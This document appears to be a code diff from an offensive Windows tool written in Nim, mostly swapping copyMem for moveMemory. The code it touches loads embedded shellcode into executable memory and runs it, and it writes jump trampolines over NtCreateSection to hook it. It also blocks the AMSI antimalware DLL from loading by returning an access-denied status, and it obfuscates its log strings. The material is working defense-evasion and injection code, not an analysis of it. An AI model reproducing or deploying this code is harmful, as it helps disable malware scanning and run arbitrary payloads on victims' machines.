@@ -143,7 +143,7 @@ const hookShellcode = slurp"hook.bin"
 var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
 proc NtCreateShellcode[byte](friendlycode: openarray[byte]): void =
     var asde: LPVOID = VirtualAlloc(nil, SIZE_T(len(friendlycode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-    copyMem(asde, unsafeAddr friendlycode[0], uint(len(friendlycode)))
+    moveMemory(asde, unsafeAddr friendlycode[0], uint(len(friendlycode)))
     var thread: Handle = cast[Handle](0)
     var threadId: LPDWORD = nil
     var pinfo: PROCESS_INFORMATION
@@ -279,13 +279,13 @@ proc redirFunction(redirect: BOOL, SectionHandle: PHANDLE, DesiredAccess: ULONG,
                     when defined(verbose):
                         echo obf("[X] Target DLL is being loaded")
                         echo obf("Stopping it by loading with READ_ONLY so that no more execution is possible")
-                    # return 0 # Return 0 to prevent AMSI from being loaded - Not working in Nim actually as winim assembly::load is throwing an error
+                    return 0xC0000054 # Return 0 to prevent AMSI from being loaded - Not working in Nim actually as winim assembly::load is throwing an error
                     # So instead we load the DLL but READ_ONLY, so that no execution is possible afterwards 
-                    if(restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PAGE_READONLY, SectionAttributes, FileHandle)):
-                        when defined(verbose):
-                            echo obf("Restore success")
-                    else:
-                        return -1
+                    #if(restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PAGE_READONLY, SectionAttributes, FileHandle)):
+                    #    when defined(verbose):
+                    #        echo obf("Restore success")
+                    #else:
+                    #    return -1
                 else:
                     if(restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)): #If it's not an AMSI DLL restore the original NtCreateSection
                         when defined(verbose):
@@ -301,14 +301,14 @@ proc redirFunction(redirect: BOOL, SectionHandle: PHANDLE, DesiredAccess: ULONG,
                 byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
             ]
             var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
-            copyMem(&trampoline[2] , &tempjumpaddr, 6)
+            moveMemory(&trampoline[2] , &tempjumpaddr, 6)
         elif defined(i386):
             trampoline = @[
                 byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
                 byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
             ]
             var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
-            copyMem(&trampoline[1] , &tempjumpaddr, 3)
+            moveMemory(&trampoline[1] , &tempjumpaddr, 3)
         
         var dwSize: DWORD = DWORD(len(trampoline))
         var dwOldProtect: DWORD = 0
@@ -321,11 +321,11 @@ proc redirFunction(redirect: BOOL, SectionHandle: PHANDLE, DesiredAccess: ULONG,
                     when defined(verbose):
                         echo obf("Previous Bytes == 0")
                     return false
-                copyMem(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
+                moveMemory(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
             if (VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)):
                 when defined(verbose):
                     echo obf("Virtual Protect to RWX success!")
-                copyMem(addressToHook, addr trampoline[0], dwSize)
+                moveMemory(addressToHook, addr trampoline[0], dwSize)
                 output = true
         
         if (not installHook):
@@ -340,7 +340,7 @@ proc redirFunction(redirect: BOOL, SectionHandle: PHANDLE, DesiredAccess: ULONG,
                     return false
                 dwSize = buffers.originalBytesSize
                 if (VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)):
-                    copyMem(addressToHook, cast[LPVOID](buffers.originalBytes), dwSize)
+                    moveMemory(addressToHook, cast[LPVOID](buffers.originalBytes), dwSize)
                     when defined(verbose):
                         echo obf("Original Bytes restored!")
                     output = true
@@ -372,7 +372,7 @@ proc redirFunction(redirect: BOOL, SectionHandle: PHANDLE, DesiredAccess: ULONG,
         buffers.previousBytesSize = DWORD(sizeof(addressToHook))
         g_hookedNtCreate.origNtCreate = cast[typeNtCreateSection](addressToHook)
         var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
-        copyMem(PointerToOrigBytes, addressToHook, 16)
+        moveMemory(PointerToOrigBytes, addressToHook, 16)
         
         output = fastTrampoline(true, cast[LPVOID](addressToHook), cast[LPVOID](MyNtCreateSection2), &buffers)
         return output
@@ -1087,7 +1087,7 @@ from winim import PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,
 from winim import fileDispositionInfo,MAX_PATH,WCHAR,INVALID_HANDLE_VALUE
 
 template RtlSecureZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)
-template RtlCopyMemory*(Destination: PVOID, Source: PVOID, Length: SIZE_T) = copyMem(Destination, Source, Length)
+template RtlCopyMemory*(Destination: PVOID, Source: PVOID, Length: SIZE_T) = moveMemory(Destination, Source, Length)
 
 proc PathFileExistsW*(pszPath: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "shlwapi", importc.}
 
